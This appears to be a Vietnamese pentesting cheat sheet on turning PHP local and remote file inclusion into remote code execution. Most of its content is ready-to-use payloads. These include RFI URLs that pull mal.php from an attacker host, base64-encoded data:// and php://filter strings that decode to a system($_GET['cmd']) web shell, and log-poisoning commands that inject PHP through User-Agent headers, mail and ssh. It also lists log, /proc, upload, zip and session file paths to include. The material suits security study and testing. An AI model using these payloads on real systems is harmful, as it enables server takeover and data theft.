# Remote File Inclusion
Để đạt được `RFI` thì cấu hình `allow_url_include` trong file `php.ini` phải là `On` mà mặc định nó là `Off` nên kỹ thuật này ít được dùng đến.<br>
Tuy nhiên nếu cấu hình đó là `On` thì khai thác dựa vào file server bạn:

```
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```

Tuy nhiên PHP có thể filter việc truy cập file từ web ngoài như trên, thì có thể sử dụng data protocol với `base64` và decode nó:
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4
```
(`PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4` => `<?php system($_GET['cmd']);echo 'Shell done !'; ?>`)

> Sử dụng `+.txt` ở cuối vì có thể app cần kết thúc bằng file `txt` và khi đó việc decode `base64` không bị ảnh hưởng gì
{: .prompt-info  }

Bài viết <a href="https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64">ở đây</a> nói rõ về điều này.

Ví dụ khác khi không sử dụng `php://` protocol:
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```
# Via log
Phần này mình sẽ gộp lại các log và file có thể `poisoning` được. Dạng này khá phổ biến và cũng khá nhiều bài viết đềp cập về nó.
## Via Apache/Nginx log file
Khi đọc được file `access.log` hay `error.log` qua các path như:
```
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
thì sẽ thấy các `param` có thể kiểm soát được như `User-Agent` hay `Referer`, khi đó chỉ việc inject code php vào để thực hiện khai thác như: `<?php system($_GET['c']); ?>`.

Ngoài ra còn có thể fuzz path khác thông qua wordlist: https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI

## Via mail, ssh, ftp
Tương tự trên thì:
- Đối với mail: `/var/log/mail` và chèn paypload khi: `mail -s "<?php system($_GET['cmd']);?>" www-data@10.10.10.10. < /dev/null`
- Đối với ssh: `/var/log/vsftpd.log` và chèn payload khi: `ssh <?php system($_GET["cmd"]);?>@10.10.10.10`
- Đối với ftp: `/var/log/vsftpd.log`
## Via /proc/PID/fd/FD
- Upload shell
- include: `/proc/$PID/fd/$FD` (`$PID` và `$FD` có thể brute-force)
## Via /proc/self/environ
Giống log file:
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
## Via upload
upload file chứa payload `<?php system($_GET['c']); ?>`
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
Đối với zip:
```
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
## Via PHP sessions
php sẽ tự tạo file session và lưu tại `/var/lib/php5/sess_[PHPSESSID]`, `/var/lib/php/sessions/sess_[PHPSESSID]` hoặc `/tmp/sess_[PHPSESSID]`
1 số input có thể lưu trong session là nơi chèn payload.
